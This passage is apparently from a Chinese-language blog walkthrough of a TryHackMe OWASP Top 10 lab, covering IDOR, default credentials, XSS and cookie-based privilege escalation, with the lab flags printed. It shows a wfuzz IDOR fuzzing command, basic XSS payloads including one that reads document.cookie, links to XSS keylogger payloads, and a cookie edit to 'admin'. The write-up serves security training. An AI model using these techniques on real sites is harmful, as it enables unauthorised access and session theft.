                      alt="image-20221205191357202"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221205191242778.png"
                      alt="image-20221205191242778"
                ></p>
<blockquote>
<p>falcon的私钥前18个字符：MIIEogIBAAKCAQEA7</p>
</blockquote>
<h2 id="严重程度TOP5-损坏的访问控制"><a href="#严重程度TOP5-损坏的访问控制" class="headerlink" title="[严重程度TOP5] 损坏的访问控制"></a>[严重程度TOP5] 损坏的访问控制</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221205112914400.png"
                      alt="image-20221205112914400"
                ></p>
<p>目标网站的某些页面可能会受到保护，从而不允许常规访问者对相关页面进行访问，例如，只有网站的管理员(admin)用户才能被允许访问 用于管理其他用户的网站页面；如果目标网站的常规访问者能够访问他们无权查看的受保护页面，那么就代表目标站点的访问控制正处于损坏状态。</p>
<p>如果 网站的普通访问者能够访问受保护的页面，可能会导致以下情况：</p>
<ul>
<li>能够查看目标站点的一些敏感信息。</li>
<li>能够访问目标站点上 未经授权的功能。</li>
</ul>
<p>OWASP 列出了一些<a class="link"   href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control.html" >展示访问控制漏洞的攻击场景 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>：</p>
<p><em><strong>场景#1</strong></em>-在通过web应用程序访问帐户信息的 SQL 调用中注入未经验证的数据：</p>
<blockquote>
<p>pstmt.setString(1, request.getParameter(“acct”));</p>
<p>ResultSet results &#x3D; pstmt.executeQuery( );</p>
</blockquote>
<p>攻击者只需修改浏览器URL中的“acct”参数即可发送他们想要访问的任何帐号ID，如果该调用没有经过正确的验证处理，那么攻击者就可以访问任何用户的帐户信息，例：</p>
<blockquote>
<p><a href="http://example.com/app/accountInfo?acct=notmyacct">http://example.com/app/accountInfo?acct=notmyacct</a></p>
</blockquote>
<p><em><strong>场景#2</strong></em>-攻击者强制浏览目标 URL（访问管理页面通常是需要管理员权限的）。</p>
<blockquote>
<p><a href="http://example.com/app/getappInfo">http://example.com/app/getappInfo</a></p>
<p><a href="http://example.com/app/admin_getappInfo">http://example.com/app/admin_getappInfo</a></p>
</blockquote>
<p>如果未经身份验证的用户可以访问目标站点的任何一个页面，则说明目标网站存在访问控制缺陷；如果非管理员用户可以访问管理页面，也说明目标网站存在访问控制缺陷。</p>
<p>简而言之，损坏的访问控制将<em><strong>允许攻击者绕过授权</strong></em>（即：发生越权操作），这可以让他们像特权用户(此处不单指admin用户，而是指相对于普通用户权限更高的用户)一样查看敏感数据或者执行其他操作。</p>
<h2 id="严重程度TOP5-损坏的访问控制（IDOR-练习）"><a href="#严重程度TOP5-损坏的访问控制（IDOR-练习）" class="headerlink" title="[严重程度TOP5] 损坏的访问控制（IDOR 练习）"></a>[严重程度TOP5] 损坏的访问控制（IDOR 练习）</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221205121133524.png"
                      alt="image-20221205121133524"
                ></p>
<p>IDOR，或者被称为不安全的直接对象引用( Insecure Direct Object Reference)，是一种利用 用户输入处理方式中的错误配置(目标站点方的设置错误)来访问通常无法访问的资源的行为，IDOR 是一种访问控制漏洞。</p>
<p><strong>例子：</strong></p>
<p>假设我们正在登录我们的银行账户，在正确通过身份验证之后，我们被导航至一个URL<code>https://example.com/bank?account_number=1234</code>，在该URL对应的网站页面上，我们可以看到自己的银行账户详细信息，并能执行一些常规操作。</p>
<p>然而，这里存在一个潜在的问题，在攻击者将 <code>account_number</code> 参数更改为 1235 等其他内容之后，如果目标站点存在相关的配置错误，那么攻击者就可以访问其他用户所对应的银行账户详细信息。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221205192842586.png"
                      alt="image-20221205192842586"
                ></p>
<p>启动目标机器，利用已知信息(用户名：noot、密码：test1234)进行用户登录操作：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221205194722934.png"
                      alt="image-20221205194722934"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221205194749516.png"
                      alt="image-20221205194749516"
                ></p>
<p>进行IDOR测试，更改浏览器URL栏中的参数值（修改为：?note&#x3D;0），尝试访问与其他用户相关的资源并获取flag：</p>
<p>tips：使用FUZZ工具（如wfuzz）进行测试–<code>?note=FUZZ</code>范围设置为0到100即可。</p>
<p><code>wfuzz -c --hh 0 -z range,0-100 http://10.10.224.32/note.php?note=FUZZ</code></p>
<p>只有0和1对应的响应码为200。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221205194844060.png"
                      alt="image-20221205194844060"
                ></p>
<blockquote>
<p>flag为：flag{fivefourthree} </p>
</blockquote>
<h2 id="严重程度TOP6-安全配置错误"><a href="#严重程度TOP6-安全配置错误" class="headerlink" title="[严重程度TOP6] 安全配置错误"></a>[严重程度TOP6] 安全配置错误</h2><p><strong>安全配置错误</strong></p>
<p>安全配置错误与其他OWASP-TOP10漏洞不同，因为它发生在本可以正确配置但未正确配置安全性机制的情况下。</p>
<p>安全配置错误包括：</p>
<ul>
<li>对云服务（如 S3 存储桶）的权限配置不当。</li>
<li>启用不必要的功能，例如某些服务、页面、帐户或权限。</li>
<li>使用密码未更改的默认帐户。</li>
<li>过于详细的错误消息提示，这将使攻击者可以找到有关目标系统的更多信息。</li>
<li>不使用<a class="link"   href="https://owasp.org/www-project-secure-headers/" >HTTP安全标头 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，或在web服务器中透露太多细节：通过HTTP 标头泄露。</li>
</ul>
<p>此漏洞通常会导致更多漏洞产生，例如允许攻击者使用默认凭据以访问某些敏感数据、允许攻击者执行 发生在admin页面上的 XXE注入或命令注入。</p>
<p>有关安全配置错误的更多信息，建议查看OWASP相关页面： <a class="link"   href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" >https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><strong>安全配置错误案例-使用默认密码</strong></p>
<p>应用程序的所有者可以并且也应该去更改该应用程序所使用的默认密码，但他们经常不会这样做。使用默认密码在嵌入式和物联网(IoT-Internet of Things)设备中尤为常见，大多数时候设备的所有者并不会去更改这些密码。</p>
<p>从攻击者的角度看，攻击方很容易尝试利用默认凭据来执行一些本不应该被允许的操作，他们能够访问管理员仪表面板、访问为系统管理员或制造商而设计的某些服务，甚至能够访问网络基础设施–这在针对企业进行攻击时可能非常有用。管理员使用默认凭证的负面影响可能很严重，从敏感信息泄露到 RCE攻击 都有可能发生。</p>
<p>2016 年 10 月，Dyn（一家 DNS 提供商）因过去 10 年最令人难忘的 DDoS 攻击之一而下线，大量恶意流量主要来自物联网设备和网络设备，如路由器、调制解调器，它们在这次DDoS 攻击中被 Mirai 恶意软件感染。</p>
<p>恶意软件是如何接管系统的？ 答案是通过利用默认密码，该恶意软件有一个包含 63 个用户名&#x2F;密码对的列表，并以此试图登录已经暴露的 telnet 服务。</p>
<p>这次 DDoS 攻击引人注目，因为它使许多大型网站和服务脱机。 Amazon、Twitter、Netflix、GitHub、Xbox Live、PlayStation Network 和更多服务在这场针对 Dyn 的 3 波 DDoS 攻击中被波及以致于离线数小时。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221205200748825.png"
                      alt="image-20221205200748825"
                ></p>
<p>启动目标机器，访问目标站点：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221205205103801.png"
                      alt="image-20221205205103801"
                ></p>
<p>尝试使用以下方法：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 通过修改URL，查看目标站点的readme.txt文件</span><br><span class="line">2. 通过修改URL，查看目标站点可能存在的页面--http[s]://url/docs</span><br><span class="line">3. 通过修改URL，查看目标站点可能存在的页面--http[s]://url/documentation</span><br><span class="line">4. 通过修改URL，查看目标站点的changelog.txt文件</span><br><span class="line">5. 通过修改URL，查看目标站点的README.md文件</span><br><span class="line">6. 查看页面源代码中的注释内容、查看页面源代码中的js文件内容......</span><br><span class="line">7. 利用网页中的关键字，在GitHub上面搜索相关的存储库，找到存储库之后查看README.md文件内容。</span><br><span class="line">8. 使用dirbuster/gobuster进行网站目录爆破 </span><br></pre></td></tr></table></figure></div>

<p>最后，我们可以在GitHub中找到目标站点相关的项目（搜索关键词<em><strong>Pensive Notes</strong></em>）：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221205211241697.png"
                      alt="image-20221205211241697"
                ></p>
<p>在相关项目的README.md文档中找到默认登录凭据：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221205211409131.png"
                      alt="image-20221205211409131"
                ></p>
<blockquote>
<p>pensive:PensiveNotes</p>
</blockquote>
<p>使用刚才发现的默认凭据进行网站登录并获取flag：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221205211541267.png"
                      alt="image-20221205211541267"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221205211630960.png"
                      alt="image-20221205211630960"
                ></p>
<blockquote>
<p>flag为：thm{4b9513968fd564a87b28aa1f9d672e17}</p>
</blockquote>
<h2 id="严重程度TOP7-跨站脚本（XSS漏洞）"><a href="#严重程度TOP7-跨站脚本（XSS漏洞）" class="headerlink" title="[严重程度TOP7] 跨站脚本（XSS漏洞）"></a>[严重程度TOP7] 跨站脚本（XSS漏洞）</h2><p><strong>XSS 概念解释</strong></p>
<p>跨站点脚本，也被称为 XSS，是一种经常能够在 Web 应用程序中被发现的安全漏洞。XSS是一种注入漏洞，攻击者可以构造恶意脚本并能够让该脚本在受害者的机器上被成功执行。</p>
<p>如果 Web 应用程序使用未经过滤的“用户输入”，则该应用程序很容易受到 XSS 攻击。 XSS在 Javascript、VBScript、Flash 和 CSS 中都是可能发生的，跨站点脚本主要分为三种类型：</p>
<ol>
<li>存储型 XSS - 最危险的 XSS 类型，往往是网站数据库中的恶意字符串的来源；如果网站允许“用户输入”在插入到数据库时未经过<em><strong>清理</strong></em>（删除用户输入的“恶意部分”），则通常会发生这种类型的XSS。</li>
<li>反射型 XSS - 如果XSS Payload是受害者对网站请求的一部分，那么该网站则会包含此payload然后响应用户的请求；总而言之，攻击者需要诱骗受害者点击一个 URL链接来执行攻击者所构造的XSS Payload。</li>
<li>基于 DOM 的 XSS - DOM 指文档对象模型，它是 HTML 和 XML 文档的编程接口，它能代表网站页面，以便程序对文档结构、样式和内容进行更改。你可以将网页理解为一个文档，这个文档可以显示在浏览器窗口中或者作为 HTML 源文件显示。</li>
</ol>
<p>如需更多关于 XSS 的解释和练习，请查看XSS相关笔记。</p>
<p><strong>XSS Payloads</strong></p>
<p>跨站点脚本是一个漏洞，我们可以利用它在受害者的机器上执行恶意 Javascript，请查看一些常用的XSS Payload类型：</p>
<ul>
<li>弹消息框 (<code>&lt;script&gt;alert(“Hello World”)&lt;/script&gt;</code>) ：在目标用户的浏览器上创建一个 Hello World 消息弹出窗口。</li>
<li>覆盖 HTML (<code>document.write</code>)：覆盖网站的 HTML 以添加攻击者所输入的内容（基本上破坏了 正常用户对完整页面的阅读体验）。</li>
<li>键盘记录器-XSS Keylogger ( <a class="link"   href="http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html" >http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ) ：可用于记录用户的键盘敲击情况，以捕获目标用户在网站页面上所输入的密码信息和其他敏感信息。</li>
<li>端口扫描器-Port scanning ( <a class="link"   href="http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html" >http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ) ：一个mini的本地端口扫描器。</li>
</ul>
<p>XSS-Payloads.com ( <a class="link"   href="http://www.xss-payloads.com/" >http://www.xss-payloads.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ) 是一个存储与 XSS 相关的Payload、工具、文档等内容的网站。 你可以在该网站下载XSS Payload，这些XSS Payload能实现 通过网络摄像头拍摄快照，或者实现一些端口扫描器和网络扫描器的相关功能。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221205223354015.png"
                      alt="image-20221205223354015"
                ></p>
<p>已知提示信息：</p>
<ul>
<li>提示1.在 Javascript <code>window.location.hostname</code> 中将显示当前主机名，你部署的机器的主机名将是其 IP 地址。</li>
<li>提示2.<code>&lt;script&gt;document.querySelector(&#39;#thm-title&#39;).textContent = &#39;I am a hacker&#39;&lt;/script&gt;</code>。</li>
</ul>
<p>启动目标机器，访问目标站点，完成注册并进行登录：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221205230328062.png"
                      alt="image-20221205230328062"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221205230434516.png"
                      alt="image-20221205230434516"
                ></p>
<p>导航至<a class="link"   href="http://machine_ip/reflected%E9%A1%B5%E9%9D%A2%EF%BC%8C%E4%BD%BF%E7%94%A8%E4%BB%A5%E4%B8%8BXSS" >http://Machine_IP/reflected页面，使用以下XSS <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> Payload（这将弹窗并显示一些文本内容），成功执行Payload之后会得到Answer：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(“<span class="title class_">Hello</span>”)&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221205230649858.png"
                      alt="image-20221205230649858"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221205230552515.png"
                      alt="image-20221205230552515"
                ></p>
<blockquote>
<p>ThereIsMoreToXSSThanYouThink</p>
</blockquote>
<p>继续使用&#x2F;reflected页面，输入以下XSS Payload（这将弹窗并显示hostname，此处为ip地址），成功执行Payload之后会得到一个Answer：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">hostname</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221205230729646.png"
                      alt="image-20221205230729646"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221205230748169.png"
                      alt="image-20221205230748169"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221205230807046.png"
                      alt="image-20221205230807046"
                ></p>
<blockquote>
<p>ReflectiveXss4TheWin</p>
</blockquote>
<p>导航至<a class="link"   href="http://machine_ip/stored%E9%A1%B5%E9%9D%A2%EF%BC%8C%E4%BD%BF%E7%94%A8%E4%BB%A5%E4%B8%8BXSS" >http://Machine_IP/stored页面，使用以下XSS <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> Payload（这将插入HTML内容），成功执行Payload之后会得到一个Answer：</p>
<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Hi my name is Hekeats<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221205230910716.png"
                      alt="image-20221205230910716"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221205231009442.png"
                      alt="image-20221205231009442"
                ></p>
<blockquote>
<p>HTML_T4gs</p>
</blockquote>
<p>继续使用&#x2F;stored页面，输入以下XSS Payload（这将弹窗并显示cookie值），成功执行Payload之后会得到一个Answer：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221205231235282.png"
                      alt="image-20221205231235282"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221205231306286.png"
                      alt="image-20221205231306286"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221205231321702.png"
                      alt="image-20221205231321702"
                ></p>
<blockquote>
<p>W3LL_D0N3_LVL2</p>
</blockquote>
<p>继续使用&#x2F;stored页面，输入以下XSS Payload（这将更改HTML页面值），成功执行Payload之后会得到一个Answer，如果没有显示 请自行刷新页面：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#thm-title&#x27;</span>).<span class="property">textContent</span> = <span class="string">&#x27;I am a hacker&#x27;</span>&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221205231513004.png"
                      alt="image-20221205231513004"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221205231829102.png"
                      alt="image-20221205231829102"
                ></p>
<blockquote>
<p>websites_can_be_easily_defaced_with_xss</p>
</blockquote>
<h2 id="严重程度TOP8-不安全的反序列化（反序列化漏洞）"><a href="#严重程度TOP8-不安全的反序列化（反序列化漏洞）" class="headerlink" title="[严重程度TOP8] 不安全的反序列化（反序列化漏洞）"></a>[严重程度TOP8] 不安全的反序列化（反序列化漏洞）</h2><p>“不安全的反序列化是一种漏洞，当不受信任的数据被用于滥用应用程序的逻辑时就会发生这种情况”（Acunetix，2017 年）</p>
<p>这个定义还是很宽泛的，简而言之，不安全的反序列化就是用恶意代码替换应用程序将要处理的数据；这将允许发生 DoS（拒绝服务）攻击、RCE（远程代码执行）攻击等一系列的攻击行为，攻击者可以利用不安全的反序列化在渗透测试场景中获得立足点。</p>
<p>具体而言，在不安全的反序列中，恶意代码实际上是利用了 Web 应用程序所使用的合法序列化、反序列化过程；我们稍后将解释这个合法过程以及为什么它在现代 Web 应用程序中如此普遍。</p>
<p>OWASP 将此漏洞评为10位中的第8位(严重程度较低) ，原因如下：</p>
<ul>
<li><p>低可利用性。 此漏洞通常视具体情况而定——没有可靠的工具&#x2F;框架，由于该漏洞性质，攻击者需要很好地了解 ToE 的内部工作原理。</p>
</li>
<li><p>此类漏洞利用仅在攻击者的技能允许时才危险，通常需要关注的问题是：因为该漏洞而暴露的数据的价值。通过反序列化漏洞发起 DoS 攻击的攻击者会使目标应用程序不可用，而DoS攻击对基础设施的业务影响会有所不同——一些组织可能会恢复得很好，而其他组织则可能不会。</p>
</li>
</ul>
<p><strong>什么目标是易受(反序列化漏洞)攻击的？</strong></p>
<p>在没有对查询或保留的数据进行验证、完整性检查的情况下就存储或获取数据的任何应用程序，都将被视为易受反序列化漏洞影响；有关这种性质的应用程序的几个例子是：</p>
<ul>
<li>电子商务网站</li>
<li>论坛</li>
<li>API’s–应用程序编程接口</li>
<li><a class="link"   href="https://cloud.tencent.com/developer/article/1881588" >应用程序运行时 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>–Application Runtimes（Tomcat、Jenkins、Jboss 等）</li>
</ul>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221205234852246.png"
                      alt="image-20221205234852246"
                ></p>
<p>tips：DoS攻击–Denial of Service</p>
<h2 id="严重程度TOP8-不安全的反序列化-对象"><a href="#严重程度TOP8-不安全的反序列化-对象" class="headerlink" title="[严重程度TOP8] 不安全的反序列化-对象"></a>[严重程度TOP8] 不安全的反序列化-对象</h2><p>作为面向对象编程 (OOP：object-oriented programming) 的一个重要元素，对象主要由两部分组成：</p>
<ul>
<li>状态</li>
<li>行为</li>
</ul>
<p>简单地说，对象允许你创建相似的代码行，而无需再次编写相同的代码行。</p>
<p>例如，一盏灯将是一个很好的对象，灯可以有 不同类型的灯泡 ，这是它的状态，而灯的 开&#x2F;关 则是它的行为！你不必考虑每种类型的灯泡以及该特定灯是否打开或关闭，因为你可以使用方法(methods)来简单地改变灯的状态和行为。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221206235215817.png"
                      alt="image-20221206235215817"
                ></p>
<h2 id="严重程度TOP8-不安全的反序列化-反序列化"><a href="#严重程度TOP8-不安全的反序列化-反序列化" class="headerlink" title="[严重程度TOP8] 不安全的反序列化-反序列化"></a>[严重程度TOP8] 不安全的反序列化-反序列化</h2><p><strong>序列化和反序列化</strong></p>
<p>通过类比来学习：一位外国游客在街上向你走来并问路，他正在寻找当地的地标，但他迷路了，不幸的是，中文不是他的强项，而你也不会说他的语言。你会怎么做呢？你可以画一张通往地标的路线图，因为图片跨越了语言障碍，这能够让他成功找到地标。 好的！你刚刚其实就是对一些信息进行了序列化，然后这位迷路的游客则对已被处理的信息进行了反序列化 从而最终找到地标。</p>
<p>简而言之：序列化是将编程中使用的对象转换为更简单、兼容的格式，以便在系统或网络之间传输以进行进一步处理或存储的过程；而反序列化则相反，反序列化能够将序列化信息转换成它们原本的复杂形式——重新变为一个应用程序可以理解的对象。</p>
<p><em><strong>例：</strong></em></p>
<p>假设有一个密码字符串“password123”，它来自一个程序，现在我们需要将该密码字符串存储到另一个系统上的数据库中；这是一个在网络中传输数据的过程，因而我们需要将此字符串&#x2F;输出转换为二进制形式（这是一个序列化过程）以便在网络中进行数据传输。</p>
<p>当然，这个密码最终还是要在目标系统中被存储为“password123”字符串形式而不是其二进制形式；所以，一旦需要被存储的数据到达了目标系统的数据库中，它就需要被转换或反序列化回“password123”字符串（这是一个反序列化过程），以便目标数据库进行存储。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207080331427.png"
                      alt="image-20221207080331427"
                ></p>
<p><strong>如何利用序列化和反序列化？</strong></p>
<p>简而言之，当来自不受信任方（即攻击方）的数据没有经过过滤处理或输入验证处理而 被系统执行时，就可能会发生不安全的反序列化；在这种情况下：系统会假定用户所输入的数据是可信的，并且会毫无保留地执行相关的数据内容，从而导致一系列安全风险的产生。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207081346257.png"
                      alt="image-20221207081346257"
                ></p>
<h2 id="严重程度TOP8-不安全的反序列化-Cookies"><a href="#严重程度TOP8-不安全的反序列化-Cookies" class="headerlink" title="[严重程度TOP8] 不安全的反序列化-Cookies"></a>[严重程度TOP8] 不安全的反序列化-Cookies</h2><p><strong>Cookies 简介</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207081523717.png"
                      alt="image-20221207081523717"
                ></p>
<p>Cookies 是现代网站运行的重要工具之一，是由网站创建并存储在用户的计算机上的微小的数据段。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207081911048.png"
                      alt="image-20221207081911048"
                ></p>
<p>你会在大多数网站上看到类似上图的通知信息，网站将使用 cookies 来存储特定于用户的行为，例如用户购物车中的商品或会话 ID；在 Web 应用程序中，我们将利用它，你会注意到 cookie 将存储如下登录信息。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207083619301.png"
                      alt="image-20221207083619301"
                ></p>
<p>虽然使用明文凭据本身就是一种漏洞，但它并不属于不安全的反序列化，因为在使用明文凭据时，我们并未发送任何要执行的序列化数据！</p>
<p>Cookie 不是一个像数据库那样的永久存储解决方案，一些 cookie（例如会话 ID）会在浏览器关闭时被清除，而其他 cookie 则可能会持续相当长的时间；cookie的具体有效时间是由创建 cookie 时所设置的“到期(Expiry)”计时器来决定的。</p>
<p>一些 cookie 有额外的属性，下面是相关的介绍：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207084956109.png"
                      alt="image-20221207084956109"
                ></p>
<p><strong>创建 Cookie</strong></p>
<p>可以使用各种网站编程语言设置 Cookie，例如Javascript、PHP 或 Python 等等；下面的Web应用是使用Python的Flask开发的，拿它来举例比较合适。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207090734279.png"
                      alt="image-20221207090734279"
                ></p>
<p>在 Flask 中设置 cookie 相当简单，上图中的代码片段会获取当前日期和时间，并将其存储在变量“timestamp”中，然后将日期和时间存储在名为“registrationTimestamp”的 cookie 中，它在浏览器中的样子为：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207093801602.png"
                      alt="image-20221207093801602"
                ></p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207093837451.png"
                      alt="image-20221207093837451"
                ></p>
<h2 id="严重程度TOP8-不安全的反序列化-基于Cookies的练习"><a href="#严重程度TOP8-不安全的反序列化-基于Cookies的练习" class="headerlink" title="[严重程度TOP8] 不安全的反序列化-基于Cookies的练习"></a>[严重程度TOP8] 不安全的反序列化-基于Cookies的练习</h2><p><strong>访问练习实例</strong></p>
<p>使用已经连接到TryHackMe VPN 的攻击机，通过浏览器导航到 <a class="link"   href="http://machine_ip/" >http://MACHINE_IP <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，此处将详细介绍使用Firefox浏览器的练习步骤–你可能需要研究如何在其他浏览器中检查 cookie。 访问目标站点之后，你将看到如下主页界面：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207094203679.png"
                      alt="image-20221207094203679"
                ></p>
<p>让我们创建一个帐户，你可以输入你所喜欢的任何内容。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207094233129.png"
                      alt="image-20221207094233129"
                ></p>
<p>完成登录行为之后，你将被重定向到个人资料页面，在此页面右侧，你可以看到你的个人详细信息。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207094417615.png"
                      alt="image-20221207094417615"
                ></p>
<p>右键单击以上页面，然后选择“检查元素-Inspect Element”，导航到“存储-Storage”选项卡。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207094605184.png"
                      alt="image-20221207094605184"
                ></p>
<p><strong>检查已编码的数据</strong></p>
<p>你会发现，这些 cookie 既有明文显示的，也有经过 base64 编码的，第一个flag将在其中一个 cookie 中找到。</p>
<p><strong>修改 Cookie 值</strong></p>
<p>请注意，你现在有一个名为“userType”的 cookie，正如你在“myprofile-我的个人资料”页面上的信息所确认的那样，你目前的身份是一名普通用户-user。</p>
<p>此web应用程序会根据你的账户类型来确定你可以看到和不能看到的内容，如果你现在想成为管理员身份该怎么办？你可以尝试修改cookie值！</p>
<p>左键双击“userType”的“Value”栏，修改内容，让我们将userType的Value更改为“admin”然后导航到 <a class="link"   href="http://machine_ip/admin" >http://MACHINE_IP/admin <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 以获得第二个flag。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207095944461.png"
                      alt="image-20221207095944461"
                ></p>
<p>启动目标机器，在攻击机的浏览器中访问目标站点并注册账户以完成登录操作：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207151136620.png"
                      alt="image-20221207151136620"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207151215577.png"
                      alt="image-20221207151215577"
                ></p>
<p>成功登录后，将进入到个人资料界面，右键单击此页面，选择“检查元素-Inspect Element”并导航到“存储-Storage”选项卡，获得第一个flag：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207151232692.png"
                      alt="image-20221207151232692"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207151446303.png"
                      alt="image-20221207151446303"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221207151648417.png"
                      alt="image-20221207151648417"
                ></p>
<blockquote>
<p>base64解码网站：<a class="link"   href="https://www.base64decode.org/" >https://www.base64decode.org/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>flag：THM{good_old_base64_huh}</p>
</blockquote>
<p>左键双击“userType”的“Value”栏，将Value更改为“admin”然后导航到 <a class="link"   href="http://machine_ip/admin" >http://MACHINE_IP/admin <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 并获得第二个flag：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
